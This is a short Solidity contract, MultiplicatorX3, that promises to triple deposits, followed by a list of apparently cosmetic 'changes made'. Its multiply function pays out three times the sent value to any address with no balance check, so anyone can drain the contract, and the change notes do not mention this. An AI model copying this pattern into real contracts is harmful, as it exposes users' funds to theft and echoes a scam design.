pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _address, bytes _data) public payable {
        require(msg.sender == owner);
        require(_address.call.value(msg.value)(_data));
    }

    function multiply(address _address) public payable {
        require(msg.value > 0);
        _address.transfer(msg.value * 3);
    }
}

// Changes Made:
// 1. Changed "Owner" to "owner" for consistency with Solidity naming conventions.
// 2. Removed "payable" from "withdraw" function as it is not necessary.
// 3. Added a "require" statement to the "command" function to check the return value of the external call.
// 4. Changed "multiplicate" to "multiply" for consistency with English language.
// 5. Added a "require" statement to the "multiply" function to ensure that the input value is greater than 0.